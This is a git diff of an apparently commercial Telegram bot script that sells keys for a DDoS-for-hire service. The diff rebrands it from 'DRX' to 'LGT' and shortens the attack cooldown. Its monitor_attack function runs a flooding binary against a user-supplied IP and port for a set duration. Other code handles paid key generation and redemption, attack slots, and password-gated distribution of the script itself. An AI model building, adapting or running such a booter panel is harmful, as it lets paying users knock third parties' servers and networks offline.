@@ -35,10 +35,10 @@ if not TOKEN:
 
 bot = telebot.TeleBot(TOKEN)
 DATA_FILE = "paid_data.json"
-SCRIPT_NAME = "drx.py"
+SCRIPT_NAME = "LGT.py"
 
 app = Flask(__name__)
-API_SECRET = "DRX_PRIVATE_API" #
+API_SECRET = "LGT_PRIVATE_API" #
 TELEGRAM_CHANNEL = "https://t.me/+B0vnERtU_lczYmY9"
 
 # Global Storage for Attacks
@@ -49,8 +49,8 @@ CONFIG = {
     "max_time": 600,
     "max_slots": 5,
     "maintenance": False,
-    "footer": "@FLASH_OWERR",
-    "cooldown": 60,  # Default cooldown 60 seconds (Ise aap /customize se change kar sakenge)
+    "footer": "@legitfs",
+    "cooldown": 30,  # Default cooldown 60 seconds (Ise aap /customize se change kar sakenge)
     "feedback_group_id": -1003943879674, # Apne group ki ID yahan dalein
 }
 # --- [ EXPIRY CONFIGURATION ] ---
@@ -63,13 +63,13 @@ SCRIPT_EXPIRY = datetime(2027, 6, 25, 12, 30, 30)
 def handle_expired_script(message):
     bot.reply_to(
         message, 
-        "⚠️ <b>SCRIPT EXPIRE OWNER TO BUY PREMIUM SCRIPT @FLASH_OWERR</b>", 
+        "⚠️ <b>SCRIPT EXPIRE OWNER TO BUY PREMIUM SCRIPT @legitfs</b>", 
         parse_mode="HTML")
         
 def is_script_expired():
     return datetime.now() > SCRIPT_EXPIRY
 # --- [ ADD TO CONFIGURATION SECTION ] ---
-DOWNLOAD_PASSWORD = "DRX-DIPANSHU" # Change this to your desired password
+DOWNLOAD_PASSWORD = "Legit_1234" # Change this to your desired password
 # --- [ DATABASE LOGIC ] ---
 def load_db():
     if not os.path.exists(DATA_FILE):
@@ -234,7 +234,7 @@ def send_help(message):
 def monitor_attack(attack_data, duration, chat_id):
     try:
         # 1. Binary ko background mein execute karna
-        binary_cmd = f"./drx {attack_data['ip']} {attack_data['port']} {duration} 500"
+        binary_cmd = f"./LGT {attack_data['ip']} {attack_data['port']} {duration} 500"
         subprocess.Popen(binary_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         # 2. SAHI TIME TAK WAIT KARNA (Isse attack jaldi khatam nahi hoga)
@@ -382,7 +382,7 @@ def show_status(message):
 
 # --- [ HELPER: GENERATE RANDOM KEY ] ---
 def generate_key(length=10):
-    return "APROX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+    return "LEGIT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
 @bot.message_handler(commands=['genkey'])
 def handle_genkey_advance(message):
@@ -435,7 +435,7 @@ def handle_genkey_advance(message):
     generated_keys = []
     for _ in range(amount):
         # Unique Key Generation
-        key = "APROX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
+        key = "LEGIT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
         db.setdefault('keys', []).append({
             "key": key, 
             "duration_hours": hours, 
@@ -477,7 +477,7 @@ def handle_redeem(message):
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"💡 <b>𝐔𝐬𝐚𝐠𝐞:</b> <code>/redeem [Your_Key]</code>\n\n"
             f"📝 <b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
-            f"<code>/redeem DRX-ABC123XYZ</code>\n"
+            f"<code>/redeem LGT-ABC123XYZ</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📞 <b>𝐁𝐮𝐲 𝐊𝐞𝐲:</b> {CONFIG['footer']}"
         )
@@ -1048,7 +1048,7 @@ def delete_key_advanced(message):
             "📝 <b>Usage:</b> <code>/dk unused 5</code>\n\n"
             "🔹 <b>𝐌𝐨𝐝𝐞 𝟐: Specific Key (Used/Unused)</b>\n"
             "Isse aap kisi bhi ek specific key ko delete kar sakte hain.\n"
-            "📝 <b>Usage:</b> <code>/dk key DRX-A1B2-C3D4</code>\n"
+            "📝 <b>Usage:</b> <code>/dk key LGT-A1B2-C3D4</code>\n"
             "━━━━━━━━━━━━━━━━━━━━━━"
         )
         bot.reply_to(message, usage_msg, parse_mode="HTML")
@@ -1166,7 +1166,7 @@ def verify_password_and_send(message):
 
     if user_input == DOWNLOAD_PASSWORD:
         # If password matches, proceed with file detection and sending
-        file_to_send = SCRIPT_NAME if os.path.exists(SCRIPT_NAME) else "drx.py"
+        file_to_send = SCRIPT_NAME if os.path.exists(SCRIPT_NAME) else "LGT.py"
         
         try:
             if os.path.exists(file_to_send):
@@ -1419,12 +1419,12 @@ def remove_group(message):
         save_db(db)
         bot.reply_to(message, f"🗑️ Group <code>{target_group}</code> access removed.", parse_mode="HTML")
 
-# --- [ COMMAND 1: UPDATE SCRIPT (drx.py) ] ---
+# --- [ COMMAND 1: UPDATE SCRIPT (LGT.py) ] ---
 @bot.message_handler(commands=['update'])
 def update_script_logic(message):
     if str(message.chat.id) not in ADMIN_IDS: return
     
-    msg = bot.reply_to(message, "🚀 <b>𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐧𝐞𝐰 <code>drx.py</code> 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰.</b>\n(Agla message aapki file honi chahiye)", parse_mode="HTML")
+    msg = bot.reply_to(message, "🚀 <b>𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐧𝐞𝐰 <code>LGT.py</code> 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰.</b>\n(Agla message aapki file honi chahiye)", parse_mode="HTML")
     bot.register_next_step_handler(msg, process_script_upload)
 
 def process_script_upload(message):
@@ -1448,7 +1448,7 @@ def process_script_upload(message):
 def upload_binary_logic(message):
     if str(message.chat.id) not in ADMIN_IDS: return
     
-    msg = bot.reply_to(message, "📤 <b>𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐁𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 (𝐞.𝐠. drx_king) 𝐧𝐨𝐰.</b>", parse_mode="HTML")
+    msg = bot.reply_to(message, "📤 <b>𝐒𝐞𝐧𝐝 𝐲𝐨𝐮𝐫 𝐁𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 (𝐞.𝐠. LGT_king) 𝐧𝐨𝐰.</b>", parse_mode="HTML")
     bot.register_next_step_handler(msg, process_binary_upload)
 
 def process_binary_upload(message):
@@ -1476,7 +1476,7 @@ def process_binary_upload(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {e}")
           
-@bot.message_handler(commands=['drxcmd'])
+@bot.message_handler(commands=['LGTcmd'])
 def show_master_admin_commands(message):
     user_id = str(message.chat.id)
     
@@ -1533,7 +1533,7 @@ def handshake():
     user_data = db.get('users', {}).get(key)
     
     if not user_data:
-        return jsonify({"status": "expired", "buy_url": "https://t.me/drx_power"}), 200
+        return jsonify({"status": "expired", "buy_url": "https://t.me/LGT_power"}), 200
     
     return jsonify({"status": "success", "expiry": user_data, "slots": f"{len(active_attacks)}/{CONFIG['max_slots']}"})
 
@@ -1558,7 +1558,7 @@ def print_banner():
 {color} | |  | | | \ \/ . \  | |    | |__| | \  /\  /  | |____| | \ \ 
 {color} |_____/|_|  \_\_/\_\ |_|     \____/   \/  \/   |______|_|  \_\
                                                                
-\033[1;37m                 🚀 DRX POWER MASTER SCRIPT 🚀
+\033[1;37m                 🚀 LGT POWER MASTER SCRIPT 🚀
 {color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \033[1;37m  👑 Owner: {CONFIG['footer']} | 🛰️ Status: Online
 {color}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}
@@ -1572,7 +1572,7 @@ if __name__ == "__main__":
         try:
             # Bot info print karna
             bot_info = bot.get_me()
-            print(f"\033[1;32m[+] DRX POWER BOT SUCCESSFUL ✅ STATED @{bot_info.username}\033[0m")
+            print(f"\033[1;32m[+] LGT POWER BOT SUCCESSFUL ✅ STATED @{bot_info.username}\033[0m")
             bot.polling(none_stop=True, interval=0, timeout=20)
         except Exception as e:
             print(f"\033[1;31m[!] Error: {e}. Restarting in 5s...\033[0m")
